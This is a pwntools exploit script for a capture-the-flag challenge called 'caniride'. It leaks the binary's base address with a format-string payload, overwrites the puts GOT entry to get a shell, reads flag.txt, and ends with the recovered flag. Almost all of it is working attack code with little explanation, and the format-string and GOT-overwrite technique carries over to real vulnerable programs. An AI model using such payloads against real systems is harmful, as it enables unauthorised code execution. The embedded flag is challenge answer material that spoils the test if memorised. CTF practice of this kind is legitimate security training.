#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template caniride
from pwn import *

HOST, PORT = "challs.actf.co 31228".split()
# Set up pwntools for the correct architecture
exe = context.binary = ELF('caniride')
libc = ELF('./libc.so') if args.REMOTE else ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b puts@plt
b exit@plt
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

def send_payload(payload):
    global io
    if not io:
        io = process([exe.path])
    io.sendlineafter(b"Name: ", payload)
    io.sendlineafter(b"driver:", b"1")
    io.sendlineafter(b"yourself: ", b"aaaa")
    io.recvuntil(b"Bye, ")
    res = io.recvuntil(b"!", drop=True)

    return res

# offset = 8
# fmt_str = FmtStr(execute_fmt=send_payload, offset=offset)

# i = int(args.BEGI, 10) if args.BEGI else 1
# payload = b""
# results = dict()
# trials_number = 1 if args.GDB else 30

# for trial in range(trials_number):
#     io = start()
#     beg_i = i
#     while len(payload) < 45:
#         payload += b"%" + str(i).encode() + b"$p;"
#         i += 1
#     end_i = i
#     log.info(f"payload: {payload}")
#     io.sendlineafter(b"Name: ", payload)
#     io.sendlineafter(b"driver:", b"1")
#     if args.GDB:
#         pause()
#     io.sendlineafter(b"yourself: ", b"a"*999)
#     io.recvuntil(b"Bye, ")
#     res = io.recvuntil(b"!", drop=True)
#     res = res.split(b";")
#     for idx, temp_i in enumerate(range(beg_i, end_i)):
#         results[temp_i] = res[idx]

#     payload = b""
#     if not args.GDB:
#         io.close()

# output = ""
# for key, val in results.items():
#     text = f"{key}: {val}"
#     print(text)
#     output += text
#     output += "\n"

# if not args.GDB:
#     with open("output.txt", "w") as file:
#         file.write(output)
# else:
#     io.interactive()
offset = 0x35a8

io = start()
payload = b"%49c%17$hn%16138c%16$hnEND"
io.sendlineafter(b"Name: ", payload)
io.sendlineafter(b"driver:", b"-3")
io.recvuntil(b"this is ")
leak = io.recvuntil(b" your driver", drop=True)
leak = u64(leak.ljust(8, b"\x00")) - offset
exe.address = leak
log.success(f"binary @ {hex(exe.address)}")
# if args.GDB:
#     pause()
io.sendlineafter(b"yourself: ", p64(exe.got.puts + 1) + p64(exe.got.puts))
io.recvuntil(b"Bye, ")
io.recvuntil(b"ND")
io.sendline(b"cat flag.txt")
timeout = 50 if args.GDB else 5
res = io.recvall(timeout=timeout)
if len(res) > 0:
    print(res)
    with open('out.log', "ab") as file:
        file.write(res)
        file.write(b"\n")
    if b"actf" in res:
        log.success("got shell!")
        io.interactive()
io.close()

# actf{h0llerin'_at_y0u_from_a_1977_mont3_car1o_a6ececa9966d}
